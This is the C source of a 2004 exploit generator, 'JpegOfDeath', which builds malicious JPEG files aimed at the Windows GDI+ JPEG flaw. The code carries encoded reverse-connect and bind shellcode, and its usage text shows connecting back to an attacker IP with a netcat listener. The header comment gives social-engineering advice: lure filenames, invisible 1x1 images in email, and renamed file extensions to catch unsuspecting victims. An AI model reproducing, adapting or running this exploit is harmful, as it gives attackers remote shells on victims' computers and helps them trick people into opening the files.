/***************************************************************
 *
 * GDI+ JPEG Remote Exploit 
 *  By John Bissell A.K.A. HighT1mes
 *
 * Exploit Name:
 * =============
 *  JpegOfDeath.c v0.5
 *
 * Date Exploit Released:
 * ======================
 *  Sep, 23, 2004
 *
 * Description:
 * ============
 *  Exploit based on FoToZ exploit but kicks the exploit up 
 *  a notch by making it have reverse connectback as well as
 *  bind features that will work with all NT based OS's.
 *  WinNT, WinXP, Win2K, Win2003, etc... Thank you FoToz for
 *  helping get a grip on the situation. I actually had got
 *  bind jpeg exploit working earlier but I could only 
 *  trigger from OllyDbg due to the heap dynamically changing...
 *
 *  If anyone who uses this exploit has used my recent AIM 
 *  remote exploit then you will have a good idea already of how
 *  to use this exploit correctly.
 *
 *  Through my limited testing I have found on a unpatched 
 *  XP SP1 system that if you click the exploit jpeg file
 *  in Windows Explorer then you will be hacked. I know there
 *  are more attack points you can take advantage of if you
 *  look for them.. So say someone goes on any web browser
 *  and they decide to save your jpeg and then later open it
 *  in explorer.exe then they will be attacked.. or maybe they
 *  got a email that has a good filename attachment title to
 *  it like "daisey fuentes porn pic.jpg" well then they 
 *  want to see it so they save it to there harddrive and open
 *  the pic in explorer.exe and game over. You just have to
 *  test and get creative. The reason this is version 0.5 is
 *  because I know rundll32.exe is MAJORALLY exploitable and I know
 *  that would make this exploit far more powerful if I 
 *  figured that part out.. I have already exploited it
 *  personally myself but I need to run some more tests to
 *  make things final for everyone... On another side note
 *  for the people out there who think you can only be affected 
 *  through viewing or downloading a jpeg attachment.. you're
 *  dead wrong.. All the attacker has to do is simply change
 *  image extension from .jpg to .bmp or .tif or whatever
 *  and stupid Windows will still treat the file as a JPEG :-p...

 *  Also the fact is this vulnerability is exploitable 
 *  without the victim clicking a link... For instance you
 *  send them the image with a 1,1 width,height and then'
 *  they can't see it in Outlook Express, so there like 
 *  man this image has a cool name so I'll try to open the
 *  attachment, then there FUCKED... Well ok they have to
 *  click in a round-about-way.. but I'm sure if you're
 *  creative enough with all those MS features you can figure
 *  something out ;-)
 *
 *  I'll most likely be putting out another version of this
 *  exploit (more dangerous) once more testing has been done. So 
 *  I encourage everyone out there to download SP2, patch your
 *  Windows systems, etc... Of course this won't be a 
 *  cure all solution :-/
 *
 * Note:
 * =====
 *  If someone wants to take advantage of the bind mode of
 *  attack in this exploit you will need to set up a script
 *  on a web server to check everyone who downloads the 
 *  jpeg exploit file and then connect back to them on the
 *  port you wanted to use with the bind attack... One of
 *  the reasons I decided to keep the bind shellcode option
 *  in here is because sometimes as you people know a
 *  firewall will be more restrictive on outbound connections
 *  and there are times where a bind attack will do just right
 *  if the reverse connect attack won't work... On ANOTHER
 *  note you can also rename your jpeg file extension to
 *  something like a .bmp or .tif and dumb Windows program's
 *  (most of them) won't give give a shit and try to load the 
 *  jpeg anyways... You can easily trick unsuspecting people 
 *  this way.. which is pretty much everyone.. right??
 *
 * Greetings:
 * ==========
 *  FoToZ, Nick DeBaggis, MicroSoft, Anthony Rocha, #romhack
 *  Peter Winter-Smith, IsolationX, YpCat, Aria Giovanni,
 *  Nick Fitzgerald, Adam Nance (where are you?),
 *  Santa Barbara, Jenna Jameson, John Kerry, so1o, 
 *  Computer Security Industry, Rom Hackers,  My chihuahuas
 *  (Rocky, Sailor, and Penny)...
 *
 *
 * Disclaimer:
 * ===========
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * Look out for a better version of this exploit in a few days.. perhaps...
 *
 ********************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#pragma comment(lib, "ws2_32.lib")

/* Exploit Data... */

char reverse_shellcode[] =
"\xD9\xE1\xD9\x34"
"\x24\x58\x58\x58\x58\x80\xE8\xE7\x31\xC9\x66\x81\xE9\xAC\xFE\x80"
"\x30\x92\x40\xE2\xFA\x7A\xA2\x92\x92\x92\xD1\xDF\xD6\x92\x75\xEB"
"\x54\xEB\x7E\x6B\x38\xF2\x4B\x9B\x67\x3F\x59\x7F\x6E\xA9\x1C\xDC"
"\x9C\x7E\xEC\x4A\x70\xE1\x3F\x4B\x97\x5C\xE0\x6C\x21\x84\xC5\xC1"
"\xA0\xCD\xA1\xA0\xBC\xD6\xDE\xDE\x92\x93\xC9\xC6\x1B\x77\x1B\xCF"
"\x92\xF8\xA2\xCB\xF6\x19\x93\x19\xD2\x9E\x19\xE2\x8E\x3F\x19\xCA"
"\x9A\x79\x9E\x1F\xC5\xB6\xC3\xC0\x6D\x42\x1B\x51\xCB\x79\x82\xF8"
"\x9A\xCC\x93\x7C\xF8\x9A\xCB\x19\xEF\x92\x12\x6B\x96\xE6\x76\xC3"
"\xC1\x6D\xA6\x1D\x7A\x1A\x92\x92\x92\xCB\x1B\x96\x1C\x70\x79\xA3"
"\x6D\xF4\x13\x7E\x02\x93\xC6\xFA\x93\x93\x92\x92\x6D\xC7\x8A\xC5"
"\xC5\xC5\xC5\xD5\xC5\xD5\xC5\x6D\xC7\x86\x1B\x51\xA3\x6D\xFA\xDF"
"\xDF\xDF\xDF\xFA\x90\x92\xB0\x83\x1B\x73\xF8\x82\xC3\xC1\x6D\xC7"
"\x82\x17\x52\xE7\xDB\x1F\xAE\xB6\xA3\x52\xF8\x87\xCB\x61\x39\x54"
"\xD6\xB6\x82\xD6\xF4\x55\xD6\xB6\xAE\x93\x93\x1B\xCE\xB6\xDA\x1B"
"\xCE\xB6\xDE\x1B\xCE\xB6\xC2\x1F\xD6\xB6\x82\xC6\xC2\xC3\xC3\xC3"
"\xD3\xC3\xDB\xC3\xC3\x6D\xE7\x92\xC3\x6D\xC7\xBA\x1B\x73\x79\x9C"
"\xFA\x6D\x6D\x6D\x6D\x6D\xA3\x6D\xC7\xB6\xC5\x6D\xC7\x9E\x6D\xC7"
"\xB2\xC1\xC7\xC4\xC5\x19\xFE\xB6\x8A\x19\xD7\xAE\x19\xC6\x97\xEA"
"\x93\x78\x19\xD8\x8A\x19\xC8\xB2\x93\x79\x71\xA0\xDB\x19\xA6\x19"
"\x93\x7C\xA3\x6D\x6E\xA3\x52\x3E\xAA\x72\xE6\x95\x53\x5D\x9F\x93"
"\x55\x79\x60\xA9\xEE\xB6\x86\xE7\x73\x19\xC8\xB6\x93\x79\xF4\x19"
"\x9E\xD9\x19\xC8\x8E\x93\x79\x19\x96\x19\x93\x7A\x79\x90\xA3\x52"
"\x1B\x78\xCD\xCC\xCF\xC9\x50\x9A\x92\x65\x6D\x44\x58\x4F\x52";

char bind_shellcode[] =
"\xD9\xE1\xD9\x34\x24\x58\x58\x58"
"\x58\x80\xE8\xE7\x31\xC9\x66\x81\xE9\x97\xFE\x80\x30\x92\x40\xE2"
"\xFA\x7A\xAA\x92\x92\x92\xD1\xDF\xD6\x92\x75\xEB\x54\xEB\x77\xDB"
"\x14\xDB\x36\x3F\xBC\x7B\x36\x88\xE2\x55\x4B\x9B\x67\x3F\x59\x7F"
"\x6E\xA9\x1C\xDC\x9C\x7E\xEC\x4A\x70\xE1\x3F\x4B\x97\x5C\xE0\x6C"
"\x21\x84\xC5\xC1\xA0\xCD\xA1\xA0\xBC\xD6\xDE\xDE\x92\x93\xC9\xC6"
"\x1B\x77\x1B\xCF\x92\xF8\xA2\xCB\xF6\x19\x93\x19\xD2\x9E\x19\xE2"
"\x8E\x3F\x19\xCA\x9A\x79\x9E\x1F\xC5\xBE\xC3\xC0\x6D\x42\x1B\x51"
"\xCB\x79\x82\xF8\x9A\xCC\x93\x7C\xF8\x98\xCB\x19\xEF\x92\x12\x6B"
"\x94\xE6\x76\xC3\xC1\x6D\xA6\x1D\x7A\x07\x92\x92\x92\xCB\x1B\x96"
"\x1C\x70\x79\xA3\x6D\xF4\x13\x7E\x02\x93\xC6\xFA\x93\x93\x92\x92"
"\x6D\xC7\xB2\xC5\xC5\xC5\xC5\xD5\xC5\xD5\xC5\x6D\xC7\x8E\x1B\x51"
"\xA3\x6D\xC5\xC5\xFA\x90\x92\x83\xCE\x1B\x74\xF8\x82\xC4\xC1\x6D"
"\xC7\x8A\xC5\xC1\x6D\xC7\x86\xC5\xC4\xC1\x6D\xC7\x82\x1B\x50\xF4"
"\x13\x7E\xC6\x92\x1F\xAE\xB6\xA3\x52\xF8\x87\xCB\x61\x39\x1B\x45"
"\x54\xD6\xB6\x82\xD6\xF4\x55\xD6\xB6\xAE\x93\x93\x1B\xEE\xB6\xDA"
"\x1B\xEE\xB6\xDE\x1B\xEE\xB6\xC2\x1F\xD6\xB6\x82\xC6\xC2\xC3\xC3"
"\xC3\xD3\xC3\xDB\xC3\xC3\x6D\xE7\x92\xC3\x6D\xC7\xA2\x1B\x73\x79"
"\x9C\xFA\x6D\x6D\x6D\x6D\x6D\xA3\x6D\xC7\xBE\xC5\x6D\xC7\x9E\x6D"
"\xC7\xBA\xC1\xC7\xC4\xC5\x19\xFE\xB6\x8A\x19\xD7\xAE\x19\xC6\x97"
"\xEA\x93\x78\x19\xD8\x8A\x19\xC8\xB2\x93\x79\x71\xA0\xDB\x19\xA6"
"\x19\x93\x7C\xA3\x6D\x6E\xA3\x52\x3E\xAA\x72\xE6\x95\x53\x5D\x9F"
"\x93\x55\x79\x60\xA9\xEE\xB6\x86\xE7\x73\x19\xC8\xB6\x93\x79\xF4"
"\x19\x9E\xD9\x19\xC8\x8E\x93\x79\x19\x96\x19\x93\x7A\x79\x90\xA3"
"\x52\x1B\x78\xCD\xCC\xCF\xC9\x50\x9A\x92\x65\x6D\x44\x58\x4F\x52";

char header1[] =
"\xFF\xD8\xFF\xE0\x00\x10\x4A\x46\x49\x46\x00\x01\x02\x00\x00\x64"
"\x00\x64\x00\x00\xFF\xEC\x00\x11\x44\x75\x63\x6B\x79\x00\x01\x00"
"\x04\x00\x00\x00\x0A\x00\x00\xFF\xEE\x00\x0E\x41\x64\x6F\x62\x65"
"\x00\x64\xC0\x00\x00\x00\x01\xFF\xFE\x00\x01\x00\x14\x10\x10\x19"
"\x12\x19\x27\x17\x17\x27\x32\xEB\x0F\x26\x32\xDC\xB1\xE7\x70\x26"
"\x2E\x3E\x35\x35\x35\x35\x35\x3E";

char setNOPs1[] =
"\xE8\x00\x00\x00\x00\x5B\x8D\x8B"
"\x00\x05\x00\x00\x83\xC3\x12\xC6\x03\x90\x43\x3B\xD9\x75\xF8";

char setNOPs2[] =
"\x3E\xE8\x00\x00\x00\x00\x5B\x8D\x8B"
"\x2F\x00\x00\x00\x83\xC3\x12\xC6\x03\x90\x43\x3B\xD9\x75\xF8";

char header2[] =
"\x44"
"\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x01\x15\x19\x19"
"\x20\x1C\x20\x26\x18\x18\x26\x36\x26\x20\x26\x36\x44\x36\x2B\x2B"
"\x36\x44\x44\x44\x42\x35\x42\x44\x44\x44\x44\x44\x44\x44\x44\x44"
"\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44"
"\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\x44\xFF\xC0\x00"
"\x11\x08\x03\x59\x02\x2B\x03\x01\x22\x00\x02\x11\x01\x03\x11\x01"
"\xFF\xC4\x00\xA2\x00\x00\x02\x03\x01\x01\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x03\x04\x01\x02\x05\x00\x06\x01\x01\x01\x01"
"\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x02"
"\x03\x10\x00\x02\x01\x02\x04\x05\x02\x03\x06\x04\x05\x02\x06\x01"
"\x05\x01\x01\x02\x03\x00\x11\x21\x31\x12\x04\x41\x51\x22\x13\x05"
"\x61\x32\x71\x81\x42\x91\xA1\xC1\x52\x23\x14\xB1\xD1\x62\x15\xF0"
"\xE1\x72\x33\x06\x82\x24\xF1\x92\x43\x53\x34\x16\xA2\xD2\x63\x83"
"\x44\x54\x25\x11\x00\x02\x01\x03\x02\x04\x03\x08\x03\x00\x02\x03"
"\x01\x00\x00\x00\x00\x01\x11\x21\x31\x02\x41\x12\xF0\x51\x61\x71"
"\x81\x91\xA1\xB1\xD1\xE1\xF1\x22\x32\x42\x52\xC1\x62\x13\x72\x92"
"\xD2\x03\x23\x82\xFF\xDA\x00\x0C\x03\x01\x00\x02\x11\x03\x11\x00"
"\x3F\x00\x0F\x90\xFF\x00\xBC\xDA\xB3\x36\x12\xC3\xD4\xAD\xC6\xDC"
"\x45\x2F\xB2\x97\xB8\x9D\xCB\x63\xFD\x26\xD4\xC6\xD7\x70\xA4\x19"
"\x24\x50\xCA\x46\x2B\xFC\xEB\x3B\xC7\xC9\xA5\x4A\x8F\x69\x26\xDF"
"\x6D\x72\x4A\x9E\x27\x6B\x3E\xE6\x92\x86\x24\x85\x04\xDB\xED\xA9"
"\x64\x8E\x6B\x63\x67\x19\x1A\xA5\xE7\xB8\x28\x3D\x09\xAB\x5D\x5F"
"\x16\xF7\x8C\xED\x49\x4C\xF5\x01\xE6\xE5\xD5\x1C\x49\xAB\x10\x71"
"\xA6\x36\x9B\x93\x24\x61\x00\x0F\x61\xEC\x34\xA7\x9C\x23\xF4\x96"
"\xC6\xE6\xAF\xB7\x80\x76\xEF\x93\xF0\xAA\x28\x8A\x6B\xE0\x18\xC0"
"\xA4\x9B\x7E\x90\x39\x03\xC2\x90\xDC\x43\x31\x91\x62\x91\x86\x23"
"\x35\x35\xA2\x80\x4D\xFA\x72\x31\x07\x9D\x03\x70\xA8\x93\x24\x4F"
"\x89\x51\x83\x5E\xA4\x2E\x7A\xC0\x7D\xA9\x8A\x10\x61\x64\x07\xFA"
"\x88\xC6\x89\x26\xDA\x0F\x20\xBD\xB9\x16\xD2\xA8\xE8\x91\x3F\x1A"
"\xE2\xBA\xF0\xBE\x74\xAB\x1D\xC4\x44\x15\x1A\x8A\x9C\xC7\x2A\x6B"
"\xA3\x33\xB7\x1E\x88\x47\x69\xA9\x64\x68\x26\xC1\x97\x0B\xD6\x86"
"\x8B\x1B\x29\xC6\x87\xE4\xC7\xFD\xCC\x53\x11\xA5\x9C\x62\x6A\xE5"
"\x40\x37\x61\x89\xF6\xB2\x9C\x2A\x7C\xFD\x05\x6A\x30\x5F\x52\x02"
"\xEB\x72\xBF\x7D\x74\x4C\x23\xB9\x8F\xD8\x78\x67\x54\x59\x64\x47"
"\xC5\x75\x21\x18\xD5\xE3\x58\xE1\x72\x63\xBF\x6D\xBD\xCB\xCA\x82"
"\x65\xE7\xDB\x09\x54\x4F\x0D\x95\x86\x76\xE3\xF2\xA0\x48\x82\x55"
"\xD7\xA6\xCE\xA7\xAA\xDC\x6A\xF1\xA9\x8E\xE0\x35\xC1\xCA\xA1\xD4"
"\x93\xD2\xD6\x39\x95\x3C\x6B\x46\x60\xAC\xC1\x3B\x60\xC9\x70\x84"
"\x8E\xA1\x9A\x9A\x20\x01\x94\xCA\x08\x91\x53\xDC\x01\xB1\xB5\x12"
"\x37\x11\xC6\xC1\xAC\xF1\x11\xD4\x9C\x6B\x3E\x69\x76\xF0\x1D\x7B"
"\x52\x6D\xC9\xA8\x66\x94\xBB\x79\x8F\x7E\xDE\x17\xFD\x4D\xAB\x1E"
"\x76\x7A\xA3\x2B\xE2\x50\x06\xB7\x2C\xEB\x2A\x49\xC9\xEA\x4E\x9B"
"\xE7\xCA\xAF\x1E\xEC\x23\xDC\x8B\xE1\x6B\x5F\x1A\x9B\xE8\x49\x2E"
"\x63\xE5\x03\x32\xCD\x19\xB8\x23\x10\x78\x1F\x85\x5C\x15\x8C\x97"
"\x84\x9B\xDB\x15\x35\x9F\x16\xE0\x1E\x86\xB9\x8F\x97\x11\x4E\xDA"
"\x35\x02\x45\x25\x93\xF8\x55\x24\x17\xB9\x1B\xF5\xC8\x07\xA9\xE2"
"\x2A\x76\xB0\xC2\x37\x01\x95\xAD\x81\xB6\x1C\x6A\xA2\x38\xD9\xAE"
"\xCA\x59\x18\x75\x25\xFF\x00\x81\xAE\xD8\xE8\xBB\x47\x62\xAC\xB7"
"\xB6\xA1\x8D\x40\xE3\x86\x65\x6D\x1E\xDB\x89\x2F\x9D\xCD\x6B\x24"
"\x62\x41\x61\x89\xAC\x2D\x8B\x3E\xB6\x68\xC0\x63\x73\x70\x6B\x6B"
"\x6A\xA1\x7A\xAC\x56\xE7\x11\x56\x58\xD4\x13\xA4\x0B\xB6\xEB\xB3"
"\x3B\x47\x22\x95\xD3\x53\x2E\xEA\x19\x86\x96\xF7\x03\x83\x52\x9E"
"\x54\xAB\x6E\x58\x63\x7C\x33\xCE\x93\xB1\x19\x1C\xE9\xDB\xAA\x35"
"\xBF\x46\x8D\xD4\xD2\x56\xE0\xE0\x33\xA1\x4D\x0A\x4E\x3B\xB1\xCD"
"\xD4\x06\x44\x56\x4A\xCD\x24\x26\xEA\x6D\x7A\x87\xDC\x3B\x60\x6D"
"\xFC\x2A\x86\x1B\x97\x36\x6D\x42\x04\xA0\x11\xEE\xE7\x46\x22\x35"
"\xD5\x26\xB0\x1C\x0B\x7C\x69\x5F\x06\xEC\x5A\xC5\x0B\x46\x70\x27"
"\xF2\xD4\x79\xAD\x89\xDA\x30\x74\xBD\x98\xE4\x68\x58\x86\xE4\x1B"
"\x69\xB9\xDC\x2B\x30\x87\x48\x53\xC5\x85\x3B\xDD\x8A\x4E\xB5\x42"
"\xB2\x8C\x6E\x2C\x01\xF8\x56\x04\x7B\xC9\xA3\x05\x4F\xB4\xD5\xA2"
"\xDF\xF6\xFD\xC6\xE2\xA7\x3C\x89\x24\xFE\xA9\x5E\xC3\xD4\x6D\xF7"
"\x85\xC9\x59\x39\x63\x59\x9B\xFF\x00\x06\x1A\x5E\xFA\x69\x0A\x46"
"\x2B\xC0\x9F\xC2\x91\x8B\xC9\x40\x58\x16\xBD\xF2\xC0\xD3\x3B\x7F"
"\x2D\xA9\xBB\x2E\x49\x42\x6D\x52\x70\x39\x62\x9F\x08\x73\x6F\x20"
"\x09\x64\x00\x01\x83\x2B\x00\xD5\x97\xBC\xDC\xF6\x9C\xA7\x66\xEA"
"\xD9\xB6\x9F\xE1\x56\xDE\xBA\xEC\x65\xB4\x44\xD8\xE3\x8D\x52\x2F"
"\x36\xCE\x74\x33\x7E\x9F\x2E\x22\x99\x8B\xC9\x6D\x5A\x6D\x9E\xA8"
"\x22\xC7\x0C\xA8\x62\x3D\x17\x1D\x2F\xC8\xFA\xD4\xB0\x9E\x14\x45"
"\x45\xD5\x6E\x96\x04\xE1\xF1\xA0\x37\x90\x5B\xD8\x7F\x81\x57\x1B"
"\xC8\xD5\x48\x27\x0E\x3C\x6B\x3D\xCD\x44\x15\x92\x41\x25\x94\x82"
"\xAE\x0E\x42\x97\x8D\x8C\x6D\xAE\x56\xB8\x26\xD8\x0F\xE3\x43\x93"
"\x73\x18\x75\x28\xD7\xF8\xD5\xFF\x00\x74\xE4\x18\xC2\x82\xAC\x6F"
"\x86\x7F\x2A\x4C\xBE\xE5\xFC\xD2\x22\xCC\x9A\x32\xD1\x7C\x7D\x68";

/* Code... */

unsigned char xor_data(unsigned char byte)
{
	return(byte ^ 0x92);
}

void print_usage(char *prog_name)
{
	printf(" Exploit Usage:\n");
	printf("\t%s -r your_ip | -b [-p port] <jpeg_filename>\n\n", prog_name);
	printf(" Parameters:\n");
	printf("\t-r your_ip or -b\t Choose -r for reverse connect attack mode\n\t\t\t\t
and choose -b for a bind attack. By default\n\t\t\t\t if you don't specify -r or
-b then a bind\n\t\t\t\t attack will be generated.\n\n");
	printf("\t-p (optional)\t\t This option will allow you to change the port \n\t\t\t\t
used for a bind or reverse connect attack.\n\t\t\t\t If the attack mode is bind
then  the\n\t\t\t\t victim will open the -p port. If the attack\n\t\t\t\t mode
is reverse connect  then the port you\n\t\t\t\t specify will be the one you want
to listen\n\t\t\t\t on so the victim can  connect to you\n\t\t\t\t right away.\n\n");
	printf(" Examples:\n");
	printf("\t%s -r 68.6.47.62 -p 8888 test.jpg\n", prog_name);
	printf("\t%s -b -p 1542 myjpg.jpg\n", prog_name);
	printf("\t%s -b whatever.jpg\n", prog_name);
	printf("\t%s -r 68.6.47.62 exploit.jpg\n\n", prog_name);
	printf(" Remember if you use the -r option to have netcat listening\n");
	printf(" on the port you are using for the attack so the victim will\n");
	printf(" be able to connect to you when exploited...\n\n");
	printf(" Example:\n");
	printf("\tnc.exe -l -p 8888");
	exit(-1);
}

int main(int argc, char *argv[])
{
	FILE *fout;
	unsigned int i = 0,j = 0;
	int raw_num = 0;
	unsigned long port = 1337; /* default port for bind and reverse attacks */
	unsigned long encoded_port = 0;
	unsigned long encoded_ip = 0;
	unsigned char attack_mode = 2; /* bind by default */
	char *p1 = NULL, *p2 = NULL;
	char ip_addr[256];
	char str_num[16];
	char jpeg_filename[256];
	WSADATA wsa;

	printf(" +------------------------------------------------+\n");
	printf(" |  JpegOfDeath - Remote GDI+ JPEG Remote Exploit |\n");
	printf(" |    Exploit by John Bissell A.K.A. HighT1mes    |\n");
	printf(" |              September, 23, 2004               |\n");
	printf(" +------------------------------------------------+\n");
	if (argc < 2)
		print_usage(argv[0]);

	/* process commandline */
	for (i = 0; i < (unsigned) argc; i++) {
		if (argv[i][0] == '-') {
			switch (argv[i][1]) {
			case 'r':
				/* reverse connect */
				strncpy(ip_addr, argv[i+1], 20);
				attack_mode = 1;
				break;
			case 'b':
				/* bind */
				attack_mode = 2;
				break;
			case 'p':
				/* port */
				port = atoi(argv[i+1]);
				break;
			}
		}
	}

	strncpy(jpeg_filename, argv[i-1], 255);
	fout = fopen(argv[i-1], "wb");
        
	if( !fout ) {
		printf("Error: JPEG File %s Not Created!\n", argv[i-1]);
		return(EXIT_FAILURE);
	}

	/* initialize the socket library */
	if (WSAStartup(MAKEWORD(1, 1), &wsa) == SOCKET_ERROR) {
		printf("Error: Winsock didn't initialize!\n");
		exit(-1);
	}

	encoded_port = htonl(port);
	encoded_port += 2;
	if (attack_mode == 1) {
		/* reverse connect attack */
		reverse_shellcode[184] = (char) 0x90;
     	reverse_shellcode[185] = (char) 0x92;
		reverse_shellcode[186] = xor_data((char)((encoded_port >> 16) & 0xff));
		reverse_shellcode[187] = xor_data((char)((encoded_port >> 24) & 0xff));

		p1 = strchr(ip_addr, '.');
		strncpy(str_num, ip_addr, p1 - ip_addr);
		raw_num = atoi(str_num);
		reverse_shellcode[179] = xor_data((char)raw_num);

		p2 = strchr(p1+1, '.');
		strncpy(str_num, ip_addr + (p1 - ip_addr) + 1, p2 - p1);
		raw_num = atoi(str_num);
		reverse_shellcode[180] = xor_data((char)raw_num);

		p1 = strchr(p2+1, '.');
		strncpy(str_num, ip_addr + (p2 - ip_addr) + 1, p1 - p2);
		raw_num = atoi(str_num);
		reverse_shellcode[181] = xor_data((char)raw_num);

		p2 = strrchr(ip_addr, '.');
		strncpy(str_num, p2+1, 5);
		raw_num = atoi(str_num);
		reverse_shellcode[182] = xor_data((char)raw_num);
	}
	if (attack_mode == 2) {
		/* bind attack */ 
		bind_shellcode[204] = (char) 0x90;
     	bind_shellcode[205] = (char) 0x92;
		bind_shellcode[191] = xor_data((char)((encoded_port >> 16) & 0xff));
		bind_shellcode[192] = xor_data((char)((encoded_port >> 24) & 0xff));
	}

	/* build the exploit jpeg */
	j = sizeof(header1) + sizeof(setNOPs1) + sizeof(header2) - 3;
      
	for(i = 0; i < sizeof(header1) - 1; i++)
		fputc(header1[i], fout);
	for(i=0;i<sizeof(setNOPs1)-1;i++)
		fputc(setNOPs1[i], fout);
	for(i=0;i<sizeof(header2)-1;i++)
		fputc(header2[i], fout);
	for( i = j; i < 0x63c; i++) 
		fputc(0x90, fout);
		j = i;
	if (attack_mode == 1) {
		for(i = 0; i < sizeof(reverse_shellcode) - 1; i++)
			fputc(reverse_shellcode[i], fout);
	}
	else if (attack_mode == 2) {
		for(i = 0; i < sizeof(bind_shellcode) - 1; i++)
			fputc(bind_shellcode[i], fout);
	}
	for(i = i + j; i < 0x1000 - sizeof(setNOPs2) + 1; i++)
		fputc(0x90, fout); 
	for( j = 0; i < 0x1000 && j < sizeof(setNOPs2) - 1; i++, j++)
		fputc(setNOPs2[j], fout);
        
	fprintf(fout, "\xFF\xD9");

	fcloseall();

	WSACleanup();

	printf("  Exploit JPEG file %s has been generated!\n", jpeg_filename);

	return(EXIT_SUCCESS);
}

// milw0rm.com [2004-09-25]